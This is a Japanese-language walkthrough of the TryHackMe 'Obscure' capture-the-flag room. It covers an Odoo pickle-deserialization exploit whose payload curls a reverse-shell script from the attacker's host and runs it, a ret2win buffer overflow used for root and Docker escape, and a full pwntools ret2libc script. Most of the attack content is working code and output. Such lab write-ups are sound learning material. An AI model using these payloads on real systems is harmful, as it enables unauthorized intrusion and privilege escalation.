# Obscure CTF

https://tryhackme.com/room/obscured

## Enumeration

```shell
TARGET=10.10.58.202
sudo bash -c "echo $TARGET   obscure.thm >> /etc/hosts"
```

### ポートスキャン

```sh
rustscan -a $TARGET

PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack ttl 61
22/tcp open  ssh     syn-ack ttl 61
80/tcp open  http    syn-ack ttl 60
```

```sh
root@ip-10-103-198-29:~# nmap -sV -p21,22,80 10.10.58.202
Starting Nmap 7.80 ( https://nmap.org ) at 2025-07-23 06:47 BST
Nmap scan report for ip-10-10-58-202.eu-west-1.compute.internal (10.10.58.202)
Host is up (0.0012s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Werkzeug httpd 0.9.6 (Python 2.7.9)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kerne
```

### FTP

anonymousで２ファイル取得

```sh
$ ls    
notice.txt  password
```

```sh
$ cat notice.txt     
From antisoft.thm security,


A number of people have been forgetting their passwords so we've made a temporary password application.
```

### password

```c
undefined8 main(void)
{
  long in_FS_OFFSET;
  undefined1 local_28 [24];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  puts("Password Recovery");
  puts("Please enter your employee id that is in your email");
  __isoc99_scanf(&DAT_0040088c,local_28);
  pass(local_28);
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}

void pass(char *param_1)
{
  int iVar1;
  long in_FS_OFFSET;
  undefined8 local_28;
  undefined8 local_20;
  undefined2 local_18;
  undefined1 local_16;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  local_28 = 0x6150657275636553;
  local_20 = 0x323164726f777373;
  local_18 = 0x2133;
  local_16 = 0;
  iVar1 = strcmp(param_1,"971234596");
  if (iVar1 == 0) {
    printf("remember this next time \'%s\'\n",&local_28);
  }
  else {
    puts("Incorrect employee id");
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

```sh
$ ./password 
Password Recovery
Please enter your employee id that is in your email
971234596
remember this next time '[REDACTED]'
```

ログイン画面からログインはできなかったが、DBバックアップのパスワードとして使用できた。

## sql

ユーザーテーブルを出力

```sql
select * from res_users;

  1 | t      | [REDACTED] |          |          1 |          3 |                            | f     |         1 |            |           | 2022-07-23 10:52:10.087949 | <span data-o-mail-quote="1">-- <br data-o-mail-quote="1">+| $pbkdf2-sha512$12000$lBJiDGHMOcc4Zwwh5Dzn/A$x.EZ/PrEodzEJ5r4JfQo2KsMZLkLT97xWZ3LsMdgwMuK1Ue.YCzfElODfWEGUOc7yYBB4fMt87ph8Sy5tN4nag
    |        |                    |          |            |            |                            |       |           |            |           |                            | Administrator</span>                                      | 
```

rockyou.txt でパスワードは割れなかったが、このメールアドレスと先ほどのパスワードを使ってWebにログインできた。

## Odoo

画面左上の Settings から。

`Odoo 10.0-20190816 (Community Edition) `

CVE-2017-10803 が有効か？ https://www.exploit-db.com/exploits/44064

Appで、`Database Anonymization` をインストール。その後、手順どおりにアップロード。

python2 で書いたリバースシェルファイル rev.py をダウンロードして実行させる。boolなんとかのサーバー側エラーが出るのは問題ない。

アップロードする pickle ファイルを出力するプログラム。python2で出力する必要がある。

```python
import cPickle
import os
import base64
import pickletools

class Exploit(object):
    def __reduce__(self):
        return (os.system, (("curl http://10.13.85.243:8000/rev.py > /tmp/rev.py; chmod +x /tmp/rev.py; python /tmp/rev.py"),))

with open("exploit.pickle", "wb") as f:
    cPickle.dump(Exploit(), f, cPickle.HIGHEST_PROTOCOL)
```

```sh
$ nc -lnvp 8888    
listening on [any] 8888 ...
connect to [10.13.85.243] from (UNKNOWN) [10.10.58.202] 47728
$ id
id
uid=105(odoo) gid=109(odoo) groups=109(odoo)
```

## 権限昇格1

/ret という見慣れないバイナリにSUIDがついている。

```sh
$ find / -perm -u=s -type f -ls 2>/dev/null
find / -perm -u=s -type f -ls 2>/dev/null
156001   40 -rwsr-xr-x   1 root     root        40000 Mar 29  2015 /bin/mount
156039   28 -rwsr-xr-x   1 root     root        27416 Mar 29  2015 /bin/umount
156006   44 -rwsr-xr-x   1 root     root        44104 Nov  8  2014 /bin/ping
156007   44 -rwsr-xr-x   1 root     root        44552 Nov  8  2014 /bin/ping6
156022   40 -rwsr-xr-x   1 root     root        40168 May 17  2017 /bin/su
142767  456 -rwsr-xr-x   1 root     root       464904 Mar 25  2019 /usr/lib/openssh/ssh-keysign
156958   40 -rwsr-xr-x   1 root     root        39912 May 17  2017 /usr/bin/newgrp
156863   44 -rwsr-xr-x   1 root     root        44464 May 17  2017 /usr/bin/chsh
156861   56 -rwsr-xr-x   1 root     root        53616 May 17  2017 /usr/bin/chfn
156909   76 -rwsr-xr-x   1 root     root        75376 May 17  2017 /usr/bin/gpasswd
156970   56 -rwsr-xr-x   1 root     root        54192 May 17  2017 /usr/bin/passwd
 10150   12 -rwsr-xr-x   1 root     root         8864 Jul 23  2022 /ret
```

いわゆる ret2win 問題。

```c
undefined8 main(void)
{
  vuln();
  return 0;
}

void vuln(void)
{
  char local_88 [128];
  
  fwrite("Exploit this binary to get on the box!\nWhat do you have for me?\n",1,0x40,stdout);
  fflush(stdout);
  gets(local_88);
  return;
}

void win(void)
{
  fwrite("congrats, you made it on the box",1,0x20,stdout);
  system("/bin/sh");
  return;
}
```

固定アドレスなので、vulnからmainに戻るときのretアドレスをwinに書き換えるだけでシェルを取れる。ただしターゲット上にpwnがないことに注意。

```sh
$ pwn checksec ./ret                                               
[*] '/home/kali/ctf/obscure/ret'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
```

win関数のアドレス

```sh
pwndbg> info address win
Symbol "win" is at 0x400646 in a file compiled without debugging.
```

```python
from pwn import *
import sys
 
host = "10.10.58.202"
port = 9997

binary = context.binary = ELF("./ret")
rop = ROP(binary)

p = remote(host, port)
#p = process('./ret')
 
log.info("[+] Starting buffer Overflow")  
p.recvuntil(b"What do you have for me?\n")
log.info("[+] Crafting payload")
payload = b'A' * (128 + 8)
payload += p64(rop.find_gadget(['ret'])[0])
payload += p64(0x400646) 
log.info("[+] Sending Payload to the remote server")
p.sendline(payload)
p.interactive()
```

下記を実行したが、リッスンしたポートに接続できず断念。

```sh
$ nc -l -p 9997 -e /ret
```

`{ data | cat } | /ret` の構文を使って実行。dataの部分は、単に上のPythonでpayloadをprintすればよい。

```sh
$ { python2 -c "print b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xd1\x04@\x00\x00\x00\x00\x00F\x06@\x00\x00\x00\x00\x00'"; cat; } | /ret

Exploit this binary to get on the box!
What do you have for me?
id
id
uid=105(odoo) gid=109(odoo) euid=0(root) groups=109(odoo)
```

```sh
cat /root/root.txt
Well done,my friend, you rooted a docker container.
```

## Dockerエスケープ

adminは付いていないので、よくあるエスケープ方法は機能しなかった。

```sh
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+eip
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
 secure-noroot: no (unlocked)
 secure-no-suid-fixup: no (unlocked)
 secure-keep-caps: no (unlocked)
uid=105(odoo)
gid=109(odoo)
groups=
```

nmapが使える。ホストOSは、postgresqlのみ開いている。

```sh
nmap 172.17.0.1

Starting Nmap 6.47 ( http://nmap.org ) at 2025-07-23 09:18 UTC
WARNING: Running Nmap setuid, as you are doing, is a major security risk.

Nmap scan report for ip-172-17-0-1.eu-west-1.compute.internal (172.17.0.1)
Host is up (0.0000070s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
80/tcp   open  http
4444/tcp open  krb524
MAC Address: 02:42:85:9B:1C:26 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 1.45 seconds
```

4444ポートにncで接続すると、retと同じ出力になっている。

```sh
nc 172.17.0.1 4444
Exploit this binary to get on the box!
What do you have for me?
```

同じペイロードを実行

```sh
{ python2 -c "print b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xd1\x04@\x00\x00\x00\x00\x00F\x06@\x00\x00\x00\x00\x00'"; cat; } | nc 172.17.0.1 4444
{ python2 -c "print b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xd1\x04@\x00\x00\x00\x00\x00F\x06@\x00\x00\x00\x00\x00'"; cat; } | nc 172.17.0.1 4444
Exploit this binary to get on the box!
What do you have for me?
id
id
uid=1000(zeeshan) gid=1000(zeeshan) groups=1000(zeeshan),27(sudo)
```

user.txt が置かれていた。ファイル１はどこかで見落としたらしい・・・  
→ `/var/lib/odoo` にあった。

id_rsa も置かれていたので、マシンIPを通してSSH接続できる。セーブポイントができて一安心。

```sh
$ ssh zeeshan@10.10.58.202 -i ./id_rsa
```

## 権限昇格

パスワードが分からないので、/exploit_me を攻略する必要がありそう。

```sh
zeeshan@hydra:~$ sudo -l
Matching Defaults entries for zeeshan on hydra:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User zeeshan may run the following commands on hydra:
    (ALL : ALL) ALL
    (root) NOPASSWD: /exploit_me
```

ret2libc と思われる。

```c
undefined8 main(void)
{
  char local_28 [32];
  
  setuid(0);
  puts("Exploit this binary for root!");
  gets(local_28);
  return 0;
}
```

ターゲットにsocatがあったので利用しようとしたが、うまくいかなかった。  
ウォークスルーでSSHを使う形を学んだ。

```python
from pwn import *
binary_file = './exploit_me'
libc = ELF('./libc.so.6')
#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# Connect to remote target
#p = remote('10.10.156.206', 1234) 
s = ssh(host='10.10.156.206',user='zeeshan',keyfile='id_rsa')
p = s.process(argv='sudo /exploit_me',shell=True)
#p = process(binary_file)

context.binary = binary = ELF(binary_file, checksec=False)
rop = ROP(binary)

# putsのアドレスを引数としてputsを呼び出す
# 最後にmain関数に戻る
padding = b"A" * 40
payload = padding  
payload += p64(rop.find_gadget(['pop rdi', 'ret'])[0])
payload += p64(binary.got.puts)
payload += p64(binary.plt.puts)    
payload += p64(binary.symbols.main)
 
p.recvline()          
p.sendline(payload)
# putsで出力したputs関数のアドレスを取得   
leak = u64(p.recvline().strip().ljust(8, b'\0'))
log.info(f'Puts leak => {hex(leak)}')  
 
# Calculate libc base
libc.address = leak - libc.symbols.puts    
log.info(f'Libc base => {hex(libc.address)}')
 
# Second payload for spawning shell
payload = padding
payload += p64(rop.find_gadget(['pop rdi', 'ret'])[0])
payload += p64(next(libc.search(b'/bin/sh')))
payload += p64(rop.find_gadget(['ret'])[0])
payload += p64(libc.symbols.system)

p.recvline()
p.sendline(payload)
p.interactive()
```

```sh
$ python ./exploit2.py
[*] '/home/kali/ctf/obscure/libc.so.6'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
[+] Connecting to 10.10.156.206 on port 22: Done
[*] zeeshan@10.10.156.206:
    Distro    Ubuntu 16.04
    OS:       linux
    Arch:     amd64
    Version:  4.4.0
    ASLR:     Enabled
    SHSTK:    Disabled
    IBT:      Disabled
[+] Starting remote process None on 10.10.156.206: pid 2277
[!] ASLR is disabled for '/bin/dash'!
[*] Loaded 14 cached gadgets for './exploit_me'
[*] Puts leak => 0x7fbfa7a496a0
[*] Libc base => 0x7fbfa79da000
[*] Switching to interactive mode
# $ id
uid=0(root) gid=0(root) groups=0(root)
```

## 振り返り

- 最大の収穫は、ターゲットにpwnがない場合の実行方法を二種類学べたこと。`{data|cat;} | /bin` の構文と、SSHを使う方法の二つ。
